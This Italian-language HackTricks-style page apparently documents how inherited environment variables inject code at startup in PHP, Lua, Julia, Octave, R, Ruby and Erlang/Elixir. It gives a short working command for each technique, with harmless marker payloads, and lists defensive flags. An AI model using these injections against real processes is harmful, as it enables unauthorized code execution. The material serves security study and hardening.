# Injection all'avvio degli interpreti macOS tramite variabili d'ambiente

{{#include ../../../banners/hacktricks-training.md}}

Queste tecniche specifiche del runtime usano variabili d'ambiente ereditate per selezionare la configurazione di avvio, precaricare codice o fornire flag alla VM prima del workload previsto. Alcune varianti si basano su file; Lua ed Erlang supportano anche l'esecuzione di codice inline.

## Configurazione di avvio PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` e `auto_prepend_file`

PHP CLI e CGI leggono la configurazione a ogni invocazione. `PHPRC` può selezionare un `php.ini` leggibile dall'attaccante, mentre `PHP_INI_SCAN_DIR` può reindirizzare la directory in cui vengono cercati altri file `.ini`. La direttiva `auto_prepend_file` fa sì che PHP analizzi un file prima dello script richiesto, quindi questa combinazione consente l'esecuzione di codice all'avvio.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Un'alternativa è una directory contenente un file `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

L'opzione `-n` ignora `php.ini`; un percorso esplicito e attendibile specificato con `-c` ha la precedenza su `PHPRC`. Ricorda che un SAPI server di lunga durata normalmente legge la configurazione all'avvio del web server, mentre CLI e CGI lo fanno a ogni invocazione.<sup>[[1]](#references)</sup>

## Codice di avvio Lua

### `LUA_INIT`

Prima di elaborare le opzioni della riga di comando o lo script di destinazione, l'interprete Lua standalone esegue `LUA_INIT_<major>_<minor>` oppure, se la variabile specifica per la versione non è presente, `LUA_INIT`. Un valore che inizia con `@` indica un file; qualsiasi altro valore viene valutato direttamente come codice Lua. Questo consente l'esecuzione all'avvio sia da file sia senza file.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Il nome esatto, comprensivo della versione, varia a seconda dell'interprete, ad esempio `LUA_INIT_5_4`. `lua -E` ignora tutte le variabili d'ambiente, inclusi il codice di avvio e i percorsi dei moduli Lua.

## Depot di avvio di Julia

### `JULIA_DEPOT_PATH` e `startup.jl`

All'avvio, Julia esegue normalmente `config/startup.jl` dal primo depot. `JULIA_DEPOT_PATH` controlla l'elenco dei depot, quindi impostandolo su un albero leggibile dall'attaccante si reindirizza il caricamento automatico del file di avvio.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Il separatore finale è utile se la vittima ha ancora bisogno dei normali pacchetti. `julia --startup-file=no` disabilita questo startup file. Cancella la variabile prima dell'avvio, perché controlla anche i registri dei pacchetti, gli ambienti, le cache e i percorsi di caricamento del codice.

## File di startup di GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave esegue all'avvio diversi file contenenti comandi Octave validi. `OCTAVE_SITE_INITFILE` sovrascrive il file di startup globale del sito e `OCTAVE_VERSION_INITFILE` sovrascrive quello specifico della versione, permettendo a ciascuna variabile di reindirizzare l'esecuzione automatica a un file leggibile dall'attaccante.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` salta solo i file utente, come `~/.octaverc`; non impedisce l'override del file di sito descritto sopra. Usa `--no-site-file` per i file di sito oppure `--norc` / `-f` per disabilitare tutti i file di avvio.<sup>[[7]](#references)</sup>

## Profili di avvio di R e caricamento dei package

### `R_PROFILE_USER` / `R_PROFILE`

All'avvio, R carica i file di profilo di sito e utente, che contengono codice R. `R_PROFILE` seleziona il profilo di sito e `R_PROFILE_USER` seleziona quello utente, consentendo a un ambiente ereditato di reindirizzare una delle due ricerche a un file leggibile dall'attaccante.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` ignora il profilo utente, `--no-site-file` ignora il profilo di sistema e `--vanilla` applica entrambe le protezioni. R elabora prima i file di ambiente selezionati da `R_ENVIRON` e `R_ENVIRON_USER`, ma questi file impostano solo variabili; le variabili di profilo sono il vettore diretto per l'esecuzione di codice arbitrario.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` e percorsi delle librerie

Durante l'avvio, R collega i pacchetti separati da virgole indicati in `R_DEFAULT_PACKAGES`. `Rscript` dà la precedenza a `R_SCRIPT_DEFAULT_PACKAGES`. Combinare una delle due variabili con `R_LIBS`, `R_LIBS_USER` o `R_LIBS_SITE` può indurre R a trovare e caricare un pacchetto installato controllato dall'attaccante; il suo hook `.onLoad` o `.onAttach` viene eseguito automaticamente.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

È necessario un pacchetto R installato e strutturalmente valido, non un semplice file `.R`. `--vanilla` non cancella le variabili ereditate direttamente, quindi un wrapper attendibile deve rimuovere o sostituire le variabili dei pacchetti predefiniti e dei percorsi delle librerie, oltre a disabilitare i file di profilo.

## Opzioni del loader Ruby

### RUBYOPT

Ruby analizza le opzioni della riga di comando supportate dalla variabile d'ambiente `RUBYOPT` prima di eseguire uno script. Ruby rifiuta l'esecuzione di codice tramite `-e` in `RUBYOPT`, ma `-I` può anteporre una directory di ricerca delle librerie e `-r` può richiedere una libreria. Un processo che avvia Ruby con variabili d'ambiente controllate da un attacker può quindi essere indotto a caricare codice Ruby controllato dall'attacker.<sup>[[10]](#references)</sup>

Crea `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Crea uno script Ruby innocuo come `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Eseguilo con un valore di `RUBYOPT` controllato:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Per disabilitare questo comportamento, passare `--disable=rubyopt` (o `--disable-rubyopt`) **prima** del nome dello script:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

Un'opzione scritta dopo `hello.rb` viene passata allo script in `ARGV`; non disabilita l'elaborazione precedente di `RUBYOPT` da parte di Ruby.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

Invece di anteporre la directory di caricamento con `-I` all'interno di `RUBYOPT`, la variabile d'ambiente separata `RUBYLIB` aggiunge directory al `$LOAD_PATH` di Ruby. In combinazione con `RUBYOPT=-r<module>`, carica il codice dell'attaccante senza bisogno di `-I` in `RUBYOPT`:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Flag VM di Erlang ed Elixir

### `ERL_AFLAGS`, `ERL_FLAGS` e `ERL_ZFLAGS`

Il launcher `erl` aggiunge `ERL_AFLAGS` all'inizio della riga di comando e `ERL_FLAGS` / `ERL_ZFLAGS` alla fine. Poiché `-eval` valuta un'espressione Erlang durante l'inizializzazione della VM, queste variabili possono consentire fileless code execution prima del workload previsto.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix e molte release di Elixir avviano infine la Erlang VM e possono ereditare questi flag. Verifica l'esatto wrapper della release: potrebbe ricostruire o ripulire gli argomenti della VM, mentre alcuni strumenti supportano esplicitamente `ERL_AFLAGS`, `ERL_ZFLAGS` o `ELIXIR_ERL_OPTIONS`.<sup>[[12]](#references)</sup>

A differenza della maggior parte delle tecniche basate su file, il payload `-eval` non richiede alcun file controllato dall'attaccante. Un wrapper attendibile dovrebbe cancellare tutte e tre le variabili dei flag Erlang (e `ELIXIR_ERL_OPTIONS` per Elixir) prima di avviare il runtime; non cercare di consentire singoli flag della VM tramite allowlist, a meno che il parser e l'ordine non siano pienamente compresi.

## References

- [1] [File di configurazione PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Interprete standalone Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Interfaccia a riga di comando di Julia: file di avvio](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Variabili d'ambiente di Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [File di avvio di GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Opzioni della riga di comando di GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Inizializzazione all'avvio di una sessione R](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [Installazione e amministrazione di R: pacchetti aggiuntivi](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Documentazione Ruby - opzioni della riga di comando di Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [Comando `erl` e variabili d'ambiente](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Release di Elixir e opzioni d'ambiente della VM](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
